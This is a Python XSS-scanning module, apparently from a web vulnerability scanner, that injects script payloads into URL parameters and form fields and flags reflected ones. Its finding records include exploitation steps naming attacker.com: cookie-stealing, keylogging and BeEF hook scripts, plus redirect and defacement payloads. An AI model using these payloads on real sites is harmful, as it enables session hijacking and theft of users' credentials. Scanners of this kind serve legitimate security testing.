import re
from core.utils import make_request, inject_payload_in_url, print_finding, print_status

MODULE = "XSS"

PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "';alert('XSS');//",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(1)">',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<details open ontoggle=alert(1)>',
    '<div onmouseover="alert(1)">hover</div>',
    "javascript:alert(1)",
    '<a href="javascript:alert(1)">click</a>',
]

REFLECTED_MARKERS = [
    (r'<script>alert\("XSS"\)</script>', "Script tag injection"),
    (r'onerror=alert\("XSS"\)', "Event handler injection"),
    (r'onload=alert\("XSS"\)', "Onload event injection"),
    (r'ontoggle=alert\(1\)', "Ontoggle event injection"),
    (r'javascript:alert\(1\)', "JavaScript URI injection"),
    (r'onmouseover="alert\(1\)"', "Mouse event injection"),
]


def scan(target_url, crawl_data):
    print_status("Testing for Cross-Site Scripting (XSS)...")
    findings = []

    all_urls = crawl_data.get("urls", [])
    forms = crawl_data.get("forms", [])

    urls_with_params = [u for u in all_urls if "?" in u]

    for url in urls_with_params:
        findings.extend(_test_reflected_xss(url))

    for form in forms:
        findings.extend(_test_form_xss(form))

    return findings


def _test_reflected_xss(url):
    findings = []
    found_params = set()
    for payload in PAYLOADS:
        injected_urls = inject_payload_in_url(url, payload)
        for injected_url, param in injected_urls:
            if param in found_params:
                continue
            resp = make_request(injected_url)
            if resp is None:
                continue

            if payload in resp.text:
                severity = "HIGH"
                xss_type = "Reflected (Unfiltered)"
            else:
                match = None
                for pattern, desc in REFLECTED_MARKERS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        match = desc
                        break
                if match:
                    severity = "HIGH"
                    xss_type = f"Reflected ({match})"
                else:
                    continue

            finding = {
                "severity": severity,
                "module": MODULE,
                "type": xss_type,
                "url": injected_url,
                "parameter": param,
                "payload": payload,
                "evidence": "Payload reflected in response body",
                "description": f"XSS payload reflected in param '{param}'",
                "exploitation": (
                    f"1. The param '{param}' reflects user input into HTML without sanitization\n"
                    f"2. Steal cookies: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n"
                    f"3. Keylogger: <script>document.onkeypress=e=>fetch('https://attacker.com/k?k='+e.key)</script>\n"
                    f"4. Phishing: inject a fake login form that sends credentials to attacker\n"
                    f"5. Session hijack: steal session cookie and replay it to impersonate the user\n"
                    f"6. Craft a malicious URL and send it to the victim (social engineering)\n"
                    f"7. BeEF framework: <script src='http://attacker:3000/hook.js'></script> for full browser control"
                ),
            }
            findings.append(finding)
            found_params.add(param)
            print_finding(severity, MODULE,
                          f"{xss_type} in param '{param}'",
                          url=injected_url,
                          detail=f"Payload: {payload}")
    return findings


def _test_form_xss(form):
    findings = []
    found_fields = set()
    action = form["action"]
    method = form["method"]
    inputs = form["inputs"]

    for payload in PAYLOADS[:6]:
        for target_input in inputs:
            if target_input["type"] in ("hidden", "submit", "button", "image", "password"):
                continue
            if target_input["name"] in found_fields:
                continue

            data = {}
            for inp in inputs:
                if inp["name"] == target_input["name"]:
                    data[inp["name"]] = payload
                else:
                    data[inp["name"]] = inp["value"] or "test"

            resp = make_request(action, method=method, data=data)
            if resp is None:
                continue

            if payload in resp.text:
                finding = {
                    "severity": "HIGH",
                    "module": MODULE,
                    "type": "Form-Based Reflected XSS",
                    "url": action,
                    "parameter": target_input["name"],
                    "payload": payload,
                    "evidence": "Payload reflected unescaped in form response",
                    "description": f"XSS in form field '{target_input['name']}' at {action}",
                    "exploitation": (
                        f"1. Enter the XSS payload in form field '{target_input['name']}'\n"
                        f"2. If stored XSS: payload executes for every user who views the page\n"
                        f"3. Steal all users' cookies: <script>new Image().src='https://attacker.com/?c='+document.cookie</script>\n"
                        f"4. Deface the page: <script>document.body.innerHTML='<h1>Hacked</h1>'</script>\n"
                        f"5. Redirect users: <script>location='https://attacker.com/phishing'</script>\n"
                        f"6. If it's a comment/post form, this becomes a stored XSS worm"
                    ),
                }
                findings.append(finding)
                found_fields.add(target_input["name"])
                print_finding("HIGH", MODULE,
                              f"Form XSS in field '{target_input['name']}'",
                              url=action,
                              detail=f"Payload: {payload}")
    return findings
